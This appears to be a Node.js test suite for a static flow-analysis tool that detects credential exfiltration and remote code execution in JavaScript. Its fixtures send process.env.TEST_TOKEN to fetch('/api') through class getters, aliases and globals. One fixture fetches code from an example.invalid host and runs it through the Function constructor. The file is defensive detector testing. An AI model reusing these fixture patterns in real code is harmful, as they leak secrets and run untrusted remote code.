'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const { createFlowAnalysis } = require('../src/flow-analysis');
const run = source => createFlowAnalysis([{ path: 'index.js', content: source }]).analyze('index.js');
const box = 'class Box{#value;constructor(value){this.#value=value}get value(){return this.#value}setValue(value){this.#value=value}}';
const exported = result => result.hints.some(h => h.kind === 'credential-export');

test('a direct primitive private getter resolves the instance field', () => {
  for (const source of [`${box}module.exports=new Box('public').value;`,
    "class Counter{#count=0;get size(){return this.#count}}module.exports=new Counter().size;"]) {
    const result = run(source);
    assert.equal(result.status, 'parsed', JSON.stringify(result.gaps));
    assert.equal(exported(result), false);
    assert.ok(Object.hasOwn(result.exports, 'value'));
  }
});

test('private getter reads use their actual Reflect.get receiver and preserve taint', () => {
  const setup = `${box}const clean=new Box('public'),secret=new Box(process.env.TEST_TOKEN);`;
  const result = run(setup + "fetch('/api',{body:Reflect.get(clean,'value',secret)});");
  assert.equal(result.status, 'parsed'); assert.equal(exported(result), true);
  const benign = run(setup + "module.exports=Reflect.get(secret,'value',clean);");
  assert.equal(benign.status, 'parsed'); assert.equal(benign.exports.value, 'public');
});

test('private and public getter spellings cannot overwrite readonly descriptor identity', () => {
  const result = run(`${box}const box=new Box(process.env.TEST_TOKEN);box['#value']='public';try{box.value='public'}catch{}fetch('/api',{body:box.value});`);
  assert.notEqual(result.status, 'parsed');
  assert.equal(exported(result), true);
});

test('instance initializer storage is fresh while declared shared aliases remain shared', () => {
  const fresh = run("class Box{state={value:'public'};set(v){this.state.value=v}read(){return this.state.value}} const a=new Box(),b=new Box();a.set(process.env.TEST_TOKEN);b.set('public');fetch('/api',{body:a.read()});");
  assert.equal(exported(fresh), true);
  const shared = run("const state={value:'public'};class Box{state=state;read(){return this.state.value}} const a=new Box(),b=new Box();state.value=process.env.TEST_TOKEN;fetch('/api',{body:a.read()});");
  assert.equal(exported(shared), true);
});

test('unsupported accessor and dormant state effects retain uncertainty', () => {
  for (const source of [
    "class Box{#value='public';get value(){return this.#value}capture(){this.#value=process.env.TEST_TOKEN}send(){fetch('/api',{body:this.value})}}",
    "class Box{#value={};get value(){return this.#value}}module.exports=new Box().value;",
    "class Box{#value=0;get value(){return this.#value+1}}",
    "class Box{#value=0;set value(v){this.#value=v}}"
  ]) assert.notEqual(run(source).status, 'parsed');
});

test('dormant constructor writes and defaults cannot clear later getter sinks', () => {
  for (const constructor of [
    'constructor(){this.#data=process.env.TEST_TOKEN}',
    'constructor(value=process.env.TEST_TOKEN){this.#data=value}'
  ]) {
    const result = run(`class Box{#data;${constructor}get value(){return this.#data}send(){fetch('/api',{body:this.value})}}module.exports=Box;`);
    assert.ok(result.status !== 'parsed' || exported(result));
  }
});

test('ordinary computed deletion and ambient assignments preserve source-to-sink effects', () => {
  for (const source of [
    "const object={};delete object[fetch('/api',{body:process.env.TEST_TOKEN})];",
    "globalThis.saved=process.env.TEST_TOKEN;fetch('/api',{body:globalThis.saved});",
    "global.saved=process.env.TEST_TOKEN;fetch('/api',{body:global.saved});"
  ]) assert.equal(exported(run(source)), true, source);
});

test('class constructor chains retain remote Function constructor detection', () => {
  const result = run("class Box{constructor(){}} const b=new Box();fetch('https://example.invalid/code').then(r=>r.text()).then(code=>b.constructor.constructor(code)());");
  assert.ok(result.hints.some(h => h.kind === 'remote-vm-code'));
});

test('getter classes retain uncertainty for unknown factory receiver writes', () => {
  const result = run("class Queue{#size=0;#head;#tail;get size(){return this.#size}append(value){const node=makeLink(value);if(this.#head)this.#tail.next=node;else this.#head=node;this.#tail=node;}} const q=new Queue();q.append('public');q.append('public');");
  assert.equal(result.status, 'unmodeled');
  assert.ok(result.gaps.some(g => g.relevant && /assignment/.test(g.reason)));
});

test('unmodeled operations cannot lose nested getter-bearing aliases', () => {
  for (const [contained, alias] of [['{box}', 'copy.box'], ['[box]', 'copy[0]'], ['{outer:{box}}', 'copy.outer.box']]) {
    const source = `class Box{#value='public';get value(){return this.#value}} const box=new Box();const copy=Object.assign({},${contained});Object.defineProperty(${alias},'value',{get:()=>process.env.TEST_TOKEN});fetch('/api',{body:box.value});`;
    assert.notEqual(run(source).status, 'parsed', contained);
  }
  const benign = run("const box={value:'public'};const copy=Object.assign({}, {box});module.exports=copy;");
  assert.equal(benign.status, 'parsed');
});

test('closed private links permit dormant writes to declared own data properties', () => {
  const result = run("class Link{value;next;constructor(value){this.value=value}}class Queue{#head;#tail;#size=0;get size(){return this.#size}append(value){const node=new Link(value);if(this.#head){this.#tail.next=node;this.#tail=node}else{this.#head=node;this.#tail=node}this.#size++}first(){return this.#head.value}clear(){this.#head=undefined;this.#tail=undefined;this.#size=0}}module.exports=Queue;");
  assert.equal(result.status, 'parsed', JSON.stringify(result.gaps));
});

test('explicit computed constructor methods preserve their return flows', () => {
  for (const [value, expected] of [['process.env.TEST_TOKEN', true], ["'public'", false]]) {
    const result = run(`class Box{['constructor'](){return ${value}}}const box=new Box();fetch('/api',{body:box.constructor()});`);
    assert.equal(result.status, 'parsed');
    assert.equal(exported(result), expected);
  }
});

test('private link shape certificates reject escaping or mutable type evidence', () => {
  const link = 'class Link{value;next;constructor(value){this.value=value}}';
  const queue = extra => `class Queue{#head;#tail;#size=0;get size(){return this.#size}append(value){const node=new Link(value);if(this.#head)this.#tail.next=node;else this.#head=node;this.#tail=node}${extra}}`;
  for (const extra of [
    'expose(){return this.#head}',
    'expose(){globalThis.saved=this.#head}',
    'expose(){const {next:link}=this.#head;external(link)}',
    'expose(){const alias=this.#head;external(alias)}',
    'expose(){delete this.#head.value}',
    'replace(undefined){this.#tail=undefined}',
    'replace({value:undefined}){this.#tail=undefined}',
    'replace([undefined]){this.#tail=undefined}',
    'replace(undefined=unknownTail){this.#tail=undefined}',
    'replace(){const {value:undefined}=unknown;this.#tail=undefined}',
    'replace(){try{external()}catch(undefined){this.#tail=undefined}}',
    'replace(value){this.#tail.next=value}',
    'expose(){this.publicHead=this.#head}'
  ]) assert.equal(run(link + queue(extra)).status, 'unmodeled', extra);
  for (const after of ["const alias=Link;", "Link=Unknown;", "Object.defineProperty(Link.prototype,'next',{set(value){}});"]) {
    assert.equal(run(link + queue('') + after).status, 'unmodeled', after);
  }
});

test('certified dormant shapes never erase secrets on actual constructed instances', () => {
  const source = "class Link{value;next;constructor(value){this.value=value}}class Queue{#head;#tail;#size=0;get size(){return this.#size}append(value){const node=new Link(value);if(this.#head)this.#tail.next=node;else this.#head=node;this.#tail=node}first(){return this.#head.value}}const q=new Queue();q.append(process.env.TEST_TOKEN);fetch('/api',{body:q.first()});";
  const result = run(source);
  assert.ok(exported(result) || result.status !== 'parsed');
});
